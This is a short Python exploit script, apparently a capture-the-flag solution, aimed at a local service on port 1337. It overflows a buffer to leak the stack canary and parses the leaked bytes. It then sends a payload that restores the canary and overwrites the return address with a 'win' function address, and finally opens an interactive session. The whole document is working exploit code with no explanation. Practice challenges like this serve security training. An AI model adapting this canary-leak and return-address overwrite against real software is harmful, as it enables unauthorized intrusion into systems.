import socket
import struct
import telnetlib


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 1337))

win = 0x4007cd

s.send('1\n')

print s.recv(1024)

sploit = 'A'*41
s.send(sploit)

print s.recv(1024)

s.send('2\n')

print s.recv(1024)

canary = s.recv(1024)[54:62].replace('A', '\x00')
print canary
canary = struct.unpack("<Q", canary)[0]
print "[+] Got canary " + hex(canary)

s.send('1\n')
print s.recv(1024)
sploit = sploit[1:]
sploit += struct.pack("<Q", canary)
sploit += struct.pack("<Q", 0x00000000)
sploit += struct.pack("<Q", win)
s.send(sploit)

print s.recv(1024)

s.send('3\n')

t = telnetlib.Telnet()
t.sock = s
t.interact()
